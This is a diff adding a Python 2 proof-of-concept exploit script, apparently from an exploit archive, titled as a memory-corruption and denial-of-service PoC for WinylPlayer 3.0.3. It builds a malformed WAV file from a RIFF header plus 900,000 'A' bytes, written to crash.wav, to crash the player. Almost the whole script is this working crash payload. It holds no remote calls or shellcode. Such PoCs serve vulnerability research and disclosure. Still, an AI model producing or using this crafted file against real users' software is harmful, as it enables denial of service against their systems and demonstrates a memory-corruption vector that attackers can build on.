@@ -1,0 +1,32 @@
+#!/usr/bin/python
+
+#[+] Author: Rajganesh (Raj) Pandurangan
+#[+] Exploit Title:  WinylPlayer 3.0.3 Memory Corruption PoC
+#[+] Date: 06-17-2015
+#[+] Category: DoS/PoC
+#[+] Tested on: WinXp/Windows 7 
+#[+] Vendor: http://vinylsoft.com/
+#[+] Download: http://vinylsoft.com/download/winyl_setup.zip
+#[+] Sites: www.exclarus.com
+#[+] Twitter: @rajganeshp
+#[+] Thanks:   offensive security (@offsectraining)
+
+
+print"###########################################################"
+print"#  Title: WinylPlayer 3.0.3 Memory Corruption PoC          #"
+print"#  Author: Rajganesh Pandurangan                           #"
+print"#  Category: DoS/PoC                                       # "
+print"###########################################################"
+	
+header = ("\x52\x49\x46\x46\x64\x31\x10\x00\x57\x41\x56\x45\x66\x6d\x74\x20"
+"\x10\x00\x00\x00\x01\x00\x01\x00\x22\x56\x00\x00\x10\xb1\x02\x00"
+"\x04\x00\x00\x00\x64\x61\x74\x61\x40\x31\x10\x00\x14\x00\x2a\x00"
+"\x1a\x00\x30\x00\x26\x00\x39\x00\x35\x00\x3c\x00\x4a\x00\x3a\x00"
+"\x5a\x00\x2f\x00\x67\x00\x0a")
+
+exploit = header
+exploit += "\x41" * 900000
+
+crash = open('crash.wav','w')
+crash.write(exploit)
+crash.close()
